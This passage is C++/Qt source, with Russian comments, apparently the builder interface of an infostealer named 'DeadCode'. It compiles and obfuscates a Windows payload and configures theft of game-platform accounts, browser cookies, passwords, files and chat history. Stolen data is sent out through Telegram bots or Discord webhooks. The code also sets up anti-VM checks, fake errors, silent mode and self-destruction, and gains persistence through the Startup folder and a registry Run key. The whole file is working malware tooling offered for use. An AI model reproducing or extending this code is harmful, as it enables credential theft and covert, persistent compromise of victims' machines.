                        }
                    } else {
                        emitLog("Ошибка сохранения артефакта");
                    }
                }
                downloadReply->deleteLater();
                isBuilding = false;
            });
        }
        reply->deleteLater();
    });
}

// Копирование иконки в директорию сборки
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        emitLog("Иконка не указана, пропуск...");
        return;
    }

    std::string destIconPath = "builds/icon.ico";
    try {
        std::filesystem::create_directories("builds");
        std::filesystem::copy_file(config.iconPath, destIconPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Иконка скопирована: " + QString::fromStdString(destIconPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()));
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется...");
        return;
    }

    isBuilding = true;
    emitLog("Начало сборки исполняемого файла...");

    updateConfigFromUI();
    generateEncryptionKeys();
    generatePolymorphicCode();
    generateJunkCode();
    generateBuildKeyHeader();

    if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
        return;
    }

    if (!std::filesystem::exists("main.cpp")) {
        emitLog("Ошибка: main.cpp не найден");
        isBuilding = false;
        return;
    }

    QString outputFile = QString::fromStdString(config.filename.empty() ? "DeadCode.exe" : config.filename);
    QString command = "g++ -o \"" + outputFile + "\" main.cpp -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
    if (!config.iconPath.empty()) {
        command += " -mwindows -I. -L. -I./include -L./lib \"" + QString::fromStdString(config.iconPath) + "\"";
    } else {
        command += " -mwindows -I. -L. -I./include -L./lib";
    }

    QProcess process;
    process.start(command);
    process.waitForFinished(-1);

    if (process.exitCode() != 0) {
        emitLog("Ошибка компиляции: " + QString::fromUtf8(process.readAllStandardError()));
        isBuilding = false;
        return;
    }

    emitLog("Файл скомпилирован: " + outputFile);

    std::string exePath = outputFile.toStdString();
    obfuscateExecutable(exePath);
    applyPolymorphicObfuscation(exePath);

    emitLog("Сборка завершена: " + outputFile);
    isBuilding = false;

    if (config.silent) {
        emitLog("Запуск кражи данных в фоновом режиме...");
        emit startStealSignal();
    }
}

// Обработчик кнопки "Собрать"
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется...");
        return;
    }
    buildExecutable();
}

// Обработчик кнопки выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString iconPath = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!iconPath.isEmpty()) {
        iconPathLineEdit->setText(iconPath);
        config.iconPath = iconPath.toStdString();
        emitLog("Иконка выбрана: " + iconPath);
    }
}

// Обработчик кнопки очистки логов
void MainWindow::on_clearLogsButton_clicked() {
    textEdit->clear();
    emitLog("Логи очищены");
}

// Сохранение конфигурации
void MainWindow::saveConfig() {
    updateConfigFromUI();
    QString filePath = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QJsonObject configObj;
    configObj["sendMethod"] = QString::fromStdString(config.sendMethod);
    configObj["buildMethod"] = QString::fromStdString(config.buildMethod);
    configObj["telegramBotToken"] = QString::fromStdString(config.telegramBotToken);
    configObj["telegramChatId"] = QString::fromStdString(config.telegramChatId);
    configObj["discordWebhook"] = QString::fromStdString(config.discordWebhook);
    configObj["filename"] = QString::fromStdString(config.filename);
    configObj["iconPath"] = QString::fromStdString(config.iconPath);
    configObj["discord"] = config.discord;
    configObj["steam"] = config.steam;
    configObj["steamMAFile"] = config.steamMAFile;
    configObj["epic"] = config.epic;
    configObj["roblox"] = config.roblox;
    configObj["battlenet"] = config.battlenet;
    configObj["minecraft"] = config.minecraft;
    configObj["cookies"] = config.cookies;
    configObj["passwords"] = config.passwords;
    configObj["screenshot"] = config.screenshot;
    configObj["fileGrabber"] = config.fileGrabber;
    configObj["systemInfo"] = config.systemInfo;
    configObj["socialEngineering"] = config.socialEngineering;
    configObj["chatHistory"] = config.chatHistory;
    configObj["telegram"] = config.telegram;
    configObj["antiVM"] = config.antiVM;
    configObj["fakeError"] = config.fakeError;
    configObj["silent"] = config.silent;
    configObj["autoStart"] = config.autoStart;
    configObj["persist"] = config.persist;
    configObj["selfDestruct"] = config.selfDestruct;

    QJsonDocument doc(configObj);
    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
        file.close();
        emitLog("Конфигурация сохранена: " + filePath);
    } else {
        emitLog("Ошибка сохранения конфигурации");
    }
}

// Загрузка конфигурации
void MainWindow::loadConfig() {
    QString filePath = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка открытия конфигурации");
        return;
    }

    QByteArray data = file.readAll();
    file.close();

    QJsonDocument doc = QJsonDocument::fromJson(data);
    if (doc.isNull()) {
        emitLog("Ошибка: Неверный формат конфигурации");
        return;
    }

    QJsonObject configObj = doc.object();
    sendMethodComboBox->setCurrentText(configObj["sendMethod"].toString());
    buildMethodComboBox->setCurrentText(configObj["buildMethod"].toString());
    tokenLineEdit->setText(configObj["telegramBotToken"].toString());
    chatIdLineEdit->setText(configObj["telegramChatId"].toString());
    discordWebhookLineEdit->setText(configObj["discordWebhook"].toString());
    fileNameLineEdit->setText(configObj["filename"].toString());
    iconPathLineEdit->setText(configObj["iconPath"].toString());
    discordCheckBox->setChecked(configObj["discord"].toBool());
    steamCheckBox->setChecked(configObj["steam"].toBool());
    steamMAFileCheckBox->setChecked(configObj["steamMAFile"].toBool());
    epicCheckBox->setChecked(configObj["epic"].toBool());
    robloxCheckBox->setChecked(configObj["roblox"].toBool());
    battlenetCheckBox->setChecked(configObj["battlenet"].toBool());
    minecraftCheckBox->setChecked(configObj["minecraft"].toBool());
    cookiesCheckBox->setChecked(configObj["cookies"].toBool());
    passwordsCheckBox->setChecked(configObj["passwords"].toBool());
    screenshotCheckBox->setChecked(configObj["screenshot"].toBool());
    fileGrabberCheckBox->setChecked(configObj["fileGrabber"].toBool());
    systemInfoCheckBox->setChecked(configObj["systemInfo"].toBool());
    socialEngineeringCheckBox->setChecked(configObj["socialEngineering"].toBool());
    chatHistoryCheckBox->setChecked(configObj["chatHistory"].toBool());
    telegramCheckBox->setChecked(configObj["telegram"].toBool());
    antiVMCheckBox->setChecked(configObj["antiVM"].toBool());
    fakeErrorCheckBox->setChecked(configObj["fakeError"].toBool());
    silentCheckBox->setChecked(configObj["silent"].toBool());
    autoStartCheckBox->setChecked(configObj["autoStart"].toBool());
    persistCheckBox->setChecked(configObj["persist"].toBool());
    selfDestructCheckBox->setChecked(configObj["selfDestruct"].toBool());

    updateConfigFromUI();
    emitLog("Конфигурация загружена: " + filePath);
}

// Экспорт логов
void MainWindow::exportLogs() {
    QString filePath = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + filePath);
    } else {
        emitLog("Ошибка экспорта логов");
    }
}

// Обработчик ответа от сервера
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() != QNetworkReply::NoError) {
        emitLog("Ошибка сети: " + reply->errorString());
    } else {
        emitLog("Ответ сервера: " + QString::fromUtf8(reply->readAll()));
    }
    reply->deleteLater();
}

// Добавление лога (уже потокобезопасно благодаря appendLog)
void MainWindow::appendLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
    textEdit->verticalScrollBar()->setValue(textEdit->verticalScrollBar()->maximum());
}

// Настройка персистентности и автозагрузки
void MainWindow::setupPersistence() {
    if (!config.autoStart && !config.persist) {
        return;
    }

    emitLog("Настройка персистентности и автозагрузки...");

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string currentExePath = exePath;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка получения APPDATA для персистентности");
        free(appDataPath);
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string persistPath = persistDir + "\\" + (config.filename.empty() ? "DeadCode.exe" : config.filename);

    try {
        std::filesystem::create_directories(persistDir);
        if (config.persist) {
            std::filesystem::copy_file(currentExePath, persistPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл скопирован для персистентности: " + QString::fromStdString(persistPath));
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования для персистентности: " + QString::fromStdString(e.what()));
        return;
    }

    if (config.autoStart) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::string appName = "DeadCode";
            if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)persistPath.c_str(), persistPath.length() + 1) == ERROR_SUCCESS) {
                emitLog("Добавлено в автозагрузку через реестр");
            } else {
                emitLog("Ошибка добавления в автозагрузку");
            }
            RegCloseKey(hKey);
        } else {
            emitLog("Ошибка открытия реестра для автозагрузки");
        }
    }

    emitLog("Настройка персистентности завершена");
}